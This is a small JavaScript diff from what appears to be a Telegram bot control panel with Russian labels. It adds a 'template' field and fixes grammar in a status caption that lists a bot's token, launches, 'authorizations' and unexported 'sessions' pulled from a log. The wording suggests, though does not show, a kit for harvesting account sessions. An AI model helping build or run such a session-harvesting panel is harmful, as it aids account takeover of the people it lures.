@@ -20,12 +20,13 @@ export default {
         await bot.editMessageCaption(query, `*🤖 Бот: @${t.username}
 
 📊 Статус:* \`${t.blocked? 'Заблокирован' : 'Запущен'}\`
+*📂 Шаблон:* \`${t.template}\`
 *🔑 Токен:* \`${t.token}\`
 
-*🚀 Запуски:* \`${starts}\`
+*🚀 Запусков:* \`${starts}\`
 *🚪 Авторизаций:* \`${statistics.all}\`
 
-*📁 Не выгруженно сессий:* \`${(await log.find({ 'bot': t.token, exported: false })).length}\``, {
+*📁 Не выгруженных сессий:* \`${(await log.find({ 'bot': t.token, exported: false })).length}\``, {
             parse_mode: "Markdown",
             reply_markup: {
                 inline_keyboard: [
